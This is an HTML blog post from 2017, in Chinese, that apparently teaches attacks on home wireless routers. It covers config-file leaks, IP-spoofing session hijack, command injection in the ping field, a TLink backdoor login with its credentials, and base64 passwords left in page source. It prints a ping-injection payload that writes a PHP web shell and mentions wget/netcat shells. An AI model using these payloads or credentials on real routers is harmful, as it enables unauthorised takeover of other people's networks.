@@ -1,0 +1,430 @@
+
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>权限提升-无线路由器漏洞攻击 | 永恒の刹那&#39;s Blog |信息安全与管理</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="John Doe">
+    
+    <meta name="description" content="CFG配置文件泄露攻击路由器配置文件指的是路由器通过备份等方式形成的文件点击按钮直接就是下载，说明配置文件已经存在内部  
+复制下载链接在没登陆的情况下，下载，发现是可以的这个漏洞不是每个路由器都存在的  
+WEB UI会话劫持攻击老漏洞。一般家用路由器不会有数据库来验证登陆的，都是用的配置文件  ">
+    
+    
+    
+    
+    <link rel="alternate" href="atom.xml" title="永恒の刹那&#39;s Blog |信息安全与管理" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="永恒の刹那&#39;s Blog |信息安全与管理">永恒の刹那&#39;s Blog |信息安全与管理</a></h1>
+				<h2 class="blog-motto">正处于大学的花季少年的博客专栏，永不停歇！</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2017/02/15/权限提升-无线路由器漏洞攻击/" title="权限提升-无线路由器漏洞攻击" itemprop="url">权限提升-无线路由器漏洞攻击</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="https://517736522.github.io" title="John Doe">John Doe</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2017-02-15T06:30:20.000Z" itemprop="datePublished">2017-02-15</time>
+    Updated:<time datetime="2017-02-15T08:13:20.475Z" itemprop="dateModified">2017-02-15</time>
+    
+  </p>
+</header>
+
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CFG配置文件泄露攻击"><span class="toc-number">1.</span> <span class="toc-text">CFG配置文件泄露攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-UI会话劫持攻击"><span class="toc-number">2.</span> <span class="toc-text">WEB UI会话劫持攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行漏洞"><span class="toc-number">3.</span> <span class="toc-text">命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网络监测漏洞"><span class="toc-number">4.</span> <span class="toc-text">网络监测漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TLink后门漏洞"><span class="toc-number">5.</span> <span class="toc-text">TLink后门漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有些路由器存在密码验证安全漏洞"><span class="toc-number">6.</span> <span class="toc-text">有些路由器存在密码验证安全漏洞  </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#乌云下也有很多漏洞"><span class="toc-number">7.</span> <span class="toc-text">乌云下也有很多漏洞  </span></a></li></ol>
+		</div>
+		
+		<h2 id="CFG配置文件泄露攻击"><a href="#CFG配置文件泄露攻击" class="headerlink" title="CFG配置文件泄露攻击"></a>CFG配置文件泄露攻击</h2><p>路由器配置文件指的是路由器通过备份等方式形成的文件<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/1.jpg" alt="1"><br>点击按钮直接就是下载，说明配置文件已经存在内部<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/2.jpg" alt="2"><br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/3.jpg" alt="3">  </p>
+<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/4.jpg" alt="4"><br>复制下载链接<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/5.jpg" alt="5"><br>在没登陆的情况下，下载，发现是可以的<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/6.jpg" alt="6"><br>这个漏洞不是每个路由器都存在的  </p>
+<h2 id="WEB-UI会话劫持攻击"><a href="#WEB-UI会话劫持攻击" class="headerlink" title="WEB UI会话劫持攻击"></a>WEB UI会话劫持攻击</h2><p>老漏洞。<br>一般家用路由器不会有数据库来验证登陆的，都是用的配置文件  </p>
+<p>1.假设10.1.1.1登陆了这个路由器<br>2.我把我的IP改为10.1.1.1<br>3.我去访问路由器，发现已经是登陆状态了<br>或者随便输账号密码就登陆进去了</p>
+<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/7.jpg" alt="7"><br>命令执行+未授权访问  </p>
+<h2 id="网络监测漏洞"><a href="#网络监测漏洞" class="headerlink" title="网络监测漏洞"></a>网络监测漏洞</h2><p>大部分路由器都是基于LINUX系统，造成原因是输入框没有过滤<br>30%的路由器都存在<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/8.jpg" alt="8"><br>那么可以这样利用<br>路由器可插入一句话木马（看你的路由器采用asp还是php环境）<br>ping 127.0.0.1 -c 1 &amp; “&lt;?php eval($_POST[a]);?&gt;” &gt; /var/www/yjh.php  </p>
+<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/9.jpg" alt="9"><br>也可以wget netcat 直连shell  </p>
+<p>使用Cookie注入绕过密码登陆Tenda路由管理页<br>xiao106347.blog.163.com/blog/static/21599201401181817753<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/10.jpg" alt="10">  </p>
+<h2 id="TLink后门漏洞"><a href="#TLink后门漏洞" class="headerlink" title="TLink后门漏洞"></a>TLink后门漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/12.jpg" alt="12"><br>访问以上网页，需要输入账号密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/13.jpg" alt="13"><br>账号osteam密码5up<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/14.jpg" alt="14">  </p>
+<h2 id="有些路由器存在密码验证安全漏洞"><a href="#有些路由器存在密码验证安全漏洞" class="headerlink" title="有些路由器存在密码验证安全漏洞  "></a>有些路由器存在密码验证安全漏洞  </h2><p>打开登陆页面-查看源文件-有时候会发现base64密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/15.jpg" alt="15"><br>截图不存在漏洞  </p>
+<h2 id="乌云下也有很多漏洞"><a href="#乌云下也有很多漏洞" class="headerlink" title="乌云下也有很多漏洞  "></a>乌云下也有很多漏洞  </h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/11.jpg" alt="11"><br>搜索路由器，牌子  </p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-share" id="share">
+
+  
+<!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+    <span class="jiathis_txt">分享到：</span>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_weixin"></a>
+    <a class="jiathis_button_renren"></a>
+    <a href="http://www.jiathis.com/share?uid=1987046" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+    <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+var jiathis_config = {data_track_clickback:'true'};
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1987046" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+
+
+</div>
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/无线渗透/">无线渗透</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/无线/">无线</a><a href="/tags/渗透/">渗透</a><a href="/tags/权限提升/">权限提升</a>
+  </div>
+
+
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2017/02/15/权限提升-破解无线路由器登陆密码/" title="权限提升-破解无线路由器登陆密码">
+  <strong>Prev:</strong><br/>
+  <span>
+  权限提升-破解无线路由器登陆密码</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/"  title="权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解">
+ <strong>Next:</strong><br/> 
+ <span>权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解
+</span>
+</a>
+</div>
+
+</nav>
+
+	<!-- 多说-->
+
+<section class="comment">
+<div class="ds-thread" data-thread-key="post-权限提升-无线路由器漏洞攻击" data-title="权限提升-无线路由器漏洞攻击" data-url="https://517736522.github.io/2017/02/15/权限提升-无线路由器漏洞攻击/"></div>
+</section>
+<!-- disqus-->
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  <p class="asidetitle">关注</p>
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/web开发/" title="web开发">web开发<sup>1</sup></a></li>
+		
+			<li><a href="/categories/无线渗透/" title="无线渗透">无线渗透<sup>32</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/CDP/" title="CDP">CDP<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Cain/" title="Cain">Cain<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Gerix/" title="Gerix">Gerix<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Hirte/" title="Hirte">Hirte<sup>1</sup></a></li>
+		
+			<li><a href="/tags/NodeJS/" title="NodeJS">NodeJS<sup>1</sup></a></li>
+		
+			<li><a href="/tags/WEP/" title="WEP">WEP<sup>4</sup></a></li>
+		
+			<li><a href="/tags/WPA/" title="WPA">WPA<sup>7</sup></a></li>
+		
+			<li><a href="/tags/WPS/" title="WPS">WPS<sup>1</sup></a></li>
+		
+			<li><a href="/tags/Yersinia/" title="Yersinia">Yersinia<sup>1</sup></a></li>
+		
+			<li><a href="/tags/aircrack-ng/" title="aircrack-ng">aircrack-ng<sup>2</sup></a></li>
+		
+			<li><a href="/tags/airdecap-ng/" title="airdecap-ng">airdecap-ng<sup>1</sup></a></li>
+		
+			<li><a href="/tags/airdrop-ng/" title="airdrop-ng">airdrop-ng<sup>1</sup></a></li>
+		
+			<li><a href="/tags/airodump-ng/" title="airodump-ng">airodump-ng<sup>1</sup></a></li>
+		
+			<li><a href="/tags/airolib-ng/" title="airolib-ng">airolib-ng<sup>1</sup></a></li>
+		
+			<li><a href="/tags/arpspoof/" title="arpspoof">arpspoof<sup>1</sup></a></li>
+		
+			<li><a href="/tags/cowpatty/" title="cowpatty">cowpatty<sup>1</sup></a></li>
+		
+			<li><a href="/tags/deauth/" title="deauth">deauth<sup>1</sup></a></li>
+		
+			<li><a href="/tags/driftnet/" title="driftnet">driftnet<sup>1</sup></a></li>
+		
+			<li><a href="/tags/ettercap/" title="ettercap">ettercap<sup>2</sup></a></li>
+		
+			<li><a href="/tags/ewsa/" title="ewsa">ewsa<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+      <li><a href="http://blog.csdn.net/517736522" target="_blank" title="517736522 csdn">CSDN</a></li>
+      <li><a href="https://github.com/517736522" target="_blank" title="517736522 github">github</a></li>
+      <li><a href="http://www.douban.com" target="_blank" title="豆瓣">豆瓣</a></li>
+    </ul>
+</div>
+
+
+  <div class="rsspart">
+	<a href="atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/3055282675" target="_blank" title="weibo"></a>
+		
+		
+		
+		<a href="https://github.com/517736522" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2017 
+		
+		<a href="https://517736522.github.io" target="_blank" title="John Doe">John Doe</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"yonghengcngithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
+</html>
+
